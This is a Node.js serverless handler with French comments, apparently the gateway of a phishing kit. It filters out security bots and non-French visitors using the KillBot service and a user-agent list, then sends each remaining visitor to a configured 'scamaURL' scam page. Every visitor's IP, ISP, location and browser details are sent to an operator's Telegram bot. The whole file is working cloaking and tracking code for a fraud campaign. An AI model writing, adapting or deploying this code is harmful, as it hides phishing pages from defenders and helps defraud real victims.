// api/index.js
import { telegramToken, telegramChatId, killBotApiKey, killBotConfigName, scamaURL } from '../config.js';
import dns from 'dns/promises';
import fs from 'fs/promises';
import path from 'path';
import { fileURLToPath } from 'url';
import fetch from 'node-fetch'; // Node 18+ dispose déjà de fetch, sinon installez node-fetch

// Pour utiliser les emojis, vous pouvez définir un objet (ici un extrait)
const emoji_flags = {
  "FR": "🇫🇷",
  "US": "🇺🇸",
  "GB": "🇬🇧",
  // … ajoutez d’autres si nécessaire
};

// --- Classe KillBot ---
class KillBot {
  constructor(apiKey, config) {
    this.apiKey = apiKey;
    this.config = config;
  }
  getClientIp(req) {
    // Si derrière CloudFlare
    if (req.headers['cf-connecting-ip']) {
      return req.headers['cf-connecting-ip'];
    }
    // Vérifie X-Forwarded-For
    if (req.headers['x-forwarded-for']) {
      return req.headers['x-forwarded-for'].split(',')[0].trim();
    }
    return req.connection?.remoteAddress || '0.0.0.0';
  }
  async httpGet(url) {
    try {
      const res = await fetch(url, { headers: { 'User-Agent': 'KillBot.to Blocker-Node' } });
      return await res.text();
    } catch (error) {
      console.error("Erreur HTTP GET:", error);
      return '';
    }
  }
  async check(req) {
    const ip = this.getClientIp(req);
    const ua = req.headers['user-agent'] || '';
    const url = `https://killbot.to/api/antiBots/${this.apiKey}/check?config=${encodeURIComponent(this.config)}&ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(ua)}`;
    const response = await this.httpGet(url);
    try {
      const decoded = JSON.parse(response);
      return decoded;
    } catch (error) {
      return { block: false };
    }
  }
}

// --- Classe Telegram ---
class Telegram {
  constructor(token, chatId) {
    this.token = token;
    this.chatId = chatId;
  }
  async sendMessage(message) {
    const url = `https://api.telegram.org/bot${this.token}/sendMessage`;
    const params = new URLSearchParams({
      chat_id: this.chatId,
      text: message,
      parse_mode: 'HTML'
    });
    try {
      const res = await fetch(url, { method: 'POST', body: params });
      return await res.json();
    } catch (error) {
      console.error("Erreur Telegram sendMessage:", error);
      return null;
    }
  }
  async sendDocument(filePath, caption = '') {
    const url = `https://api.telegram.org/bot${this.token}/sendDocument`;
    const FormData = (await import('form-data')).default;
    const form = new FormData();
    form.append('chat_id', this.chatId);
    form.append('caption', caption);
    form.append('document', await fs.readFile(filePath), { filename: path.basename(filePath) });
    try {
      const res = await fetch(url, { method: 'POST', body: form });
      return await res.json();
    } catch (error) {
      console.error("Erreur Telegram sendDocument:", error);
      return null;
    }
  }
}

// --- Fonction utilitaire : Vérifie si le User-Agent correspond à un bot ---
async function isBotUserAgent(ua, blockedUAFilePath) {
  try {
    const data = await fs.readFile(blockedUAFilePath, 'utf8');
    const lines = data.split(/\r?\n/).map(line => line.trim()).filter(Boolean);
    for (const line of lines) {
      if (line.startsWith('#>')) {
        let pattern = line.replace(/^#>\s*/, '').replace(/\s*\[ Bot \]\s*$/, '').trim();
        if (pattern && ua.toLowerCase().includes(pattern.toLowerCase())) {
          return true;
        }
      }
    }
    return false;
  } catch (error) {
    // Si le fichier n'existe pas, on considère qu'il n'y a rien à bloquer
    return false;
  }
}

// --- Définir le chemin du répertoire courant ---
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// --- Handler de la fonction API ---
export default async function handler(req, res) {
  const killBot = new KillBot(killBotApiKey, killBotConfigName);
  const telegram = new Telegram(telegramToken, telegramChatId);

  const visitorIp = killBot.getClientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  const referrer = req.headers['referer'] || '';
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const currentUrl = `${protocol}://${req.headers.host}${req.url}`;

  // Définition des chemins pour les fichiers (attention à la persistance sur Vercel)
  const botsIpsFile = path.join(__dirname, 'bots_ips.txt');
  const blockedUAFile = path.join(__dirname, 'blocked.txt');

  // 1) Récupère la liste d’IP déjà bloquées
  let blockedIps = [];
  try {
    const botsData = await fs.readFile(botsIpsFile, 'utf8');
    blockedIps = botsData.split(/\r?\n/).filter(line => line.trim() !== '');
  } catch (error) {
    // Si le fichier n'existe pas, on continue avec une liste vide
  }

  // 2) Si l'IP est déjà bloquée, rediriger vers /login
  if (blockedIps.includes(visitorIp)) {
    res.writeHead(302, { Location: '/login' });
    res.end();
    return;
  }

  // 3) Vérifie si le User-Agent est dans blocked.txt
  const isBotUA = await isBotUserAgent(userAgent, blockedUAFile);

  // 4) Vérifie via KillBot
  const checkResult = await killBot.check(req);
  const isBotByKillBot = checkResult.block === true;

  // 5) Vérifie si le visiteur n'est pas en France (d'après KillBot)
  const ipLocation = checkResult.IPlocation || {};
  const countryCode = ipLocation.countryCode || '??';
  const isNotFromFrance = (countryCode !== 'FR');

  // Si le visiteur est considéré comme bot
  if (isBotUA || isBotByKillBot || isNotFromFrance) {
    // Ajoute l'IP dans bots_ips.txt
    await fs.appendFile(botsIpsFile, visitorIp + '\n');
    let messageBot = "❌<u>Nouveau BOT</u>❌\n";
    if (isBotUA) {
      messageBot += "Détection : blocked.txt (UA)\n";
    } else if (isBotByKillBot) {
      messageBot += "Détection : KillBot\n";
    } else if (isNotFromFrance) {
      messageBot += `Détection : Pays != FR (${countryCode})\n`;
    }
    messageBot += `\n<b>IP:</b> ${visitorIp}`;
    if (ipLocation.isp) messageBot += `\n<b>ISP:</b> ${ipLocation.isp}`;
    const paysEmoji = emoji_flags[countryCode] || '';
    messageBot += `\n<b>Pays:</b> ${paysEmoji} ${ipLocation.country || ''}`;
    if (ipLocation.type) messageBot += `\n<b>Type de connexion:</b> ${ipLocation.type}`;
    if (ipLocation.zip) messageBot += `\n<b>ZIP:</b> ${ipLocation.zip}`;
    if (ipLocation.city) messageBot += `\n<b>City:</b> ${ipLocation.city}`;
    messageBot += `\n<b>User-Agent:</b> ${userAgent}`;
    if (referrer) messageBot += `\n<b>Referrer:</b> ${referrer}`;
    messageBot += `\n<b>URL Courante:</b> ${currentUrl}`;

    // Envoi du message sur Telegram
    await telegram.sendMessage(messageBot);
    // Envoi du fichier bots_ips.txt (optionnel)
    await telegram.sendDocument(botsIpsFile, "Liste bots mise à jour");

    res.writeHead(302, { Location: '/login' });
    res.end();
    return;
  }

  // Sinon, visiteur légitime : envoi d'un message Telegram et redirection vers scamaURL
  let messageLegit = "🟢<u>Visiteur Légitime</u>🟢\n";
  messageLegit += `<b>IP:</b> ${visitorIp}`;
  if (ipLocation.isp) messageLegit += `\n<b>ISP:</b> ${ipLocation.isp}`;
  const paysEmoji = emoji_flags[countryCode] || '';
  messageLegit += `\n<b>Pays:</b> ${paysEmoji} ${ipLocation.country || ''}`;
  if (ipLocation.type) messageLegit += `\n<b>Type de connexion:</b> ${ipLocation.type}`;
  if (ipLocation.zip) messageLegit += `\n<b>ZIP:</b> ${ipLocation.zip}`;
  if (ipLocation.city) messageLegit += `\n<b>City:</b> ${ipLocation.city}`;
  messageLegit += `\n<b>User-Agent:</b> ${userAgent}`;
  if (referrer) messageLegit += `\n<b>Referrer:</b> ${referrer}`;
  messageLegit += `\n<b>URL Courante:</b> ${currentUrl}`;

  await telegram.sendMessage(messageLegit);
  res.writeHead(302, { Location: scamaURL });
  res.end();
}